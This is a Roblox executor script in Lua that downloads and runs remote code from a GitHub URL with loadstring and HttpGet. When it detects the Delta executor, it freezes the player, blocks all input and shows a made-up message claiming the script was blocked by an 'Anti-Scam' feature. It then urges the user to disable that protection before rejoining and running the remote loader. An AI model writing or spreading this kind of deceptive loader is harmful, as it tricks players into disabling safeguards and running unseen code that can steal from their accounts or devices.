local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ContextActionService = game:GetService("ContextActionService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

local function freezePlayer()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.AutoRotate = false
    end
end

local function runLoader()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
    end)
end

local function showFreezeUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game:GetService("CoreGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true

    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.Size = UDim2.new(0, 460, 0, 260)
    Frame.Position = UDim2.new(0.5, -230, 0.5, -130)
    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Frame.BackgroundTransparency = 0.15
    Frame.ZIndex = 11
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)

    Frame.Size = UDim2.new(0, 0, 0, 0)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)

    local Label = Instance.new("TextLabel")
    Label.Parent = Frame
    Label.BackgroundTransparency = 1
    Label.Size = UDim2.new(1, -20, 1, -100)
    Label.Position = UDim2.new(0, 10, 0, 10)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 16
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.TextYAlignment = Enum.TextYAlignment.Top
    Label.TextWrapped = true
    Label.ZIndex = 11
    Label.Text = [[
Script requires the teleport function, but it was blocked due to the Anti-Scam feature.

To disable this feature:

1) Rejoin this game
2) Turn off Anti-Scam in Delta settings
3) Execute our script again or use executors like KRNL, etc.
]]

    local InfoLabel = Instance.new("TextLabel")
    InfoLabel.Parent = Frame
    InfoLabel.BackgroundTransparency = 1
    InfoLabel.Size = UDim2.new(1, -20, 0, 20)
    InfoLabel.Position = UDim2.new(0, 0, 1, -95)
    InfoLabel.Font = Enum.Font.GothamBold
    InfoLabel.TextSize = 10
    InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    InfoLabel.TextXAlignment = Enum.TextXAlignment.Center
    InfoLabel.TextYAlignment = Enum.TextYAlignment.Center
    InfoLabel.TextWrapped = true
    InfoLabel.ZIndex = 11
    InfoLabel.Text = 'AFTER YOU TAP "REJOIN" BUTTON WAIT FOR 30 SECONDS TO USE THE SCRIPT'

    local Button = Instance.new("TextButton")
    Button.Parent = Frame
    Button.Size = UDim2.new(0, 140, 0, 40)
    Button.Position = UDim2.new(0.5, -70, 1, -50)
    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Text = "Rejoin"
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 18
    Button.ZIndex = 12
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)

    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 460, 0, 260),
        Position = UDim2.new(0.5, -230, 0.5, -130)
    }):Play()

    ContextActionService:BindAction("FreezeAllInputs", function(_, state) return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
    ContextActionService:BindAction("FreezeAllKeys", function(_, state) return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))

    Button.MouseButton1Click:Connect(function()
        ContextActionService:UnbindAction("FreezeAllInputs")
        ContextActionService:UnbindAction("FreezeAllKeys")
        TeleportService:Teleport(game.PlaceId, player)

        player.CharacterAdded:Wait()
        task.wait(30)
        runLoader()
    end)

    freezePlayer()
end

local function isDeltaExecutor()
    local ok, res = pcall(function()
        return not (syn or KRNL or Fluxus or Protosmasher)
    end)
    return ok and res
end

if isDeltaExecutor() then
    showFreezeUI()
else
    runLoader()
end
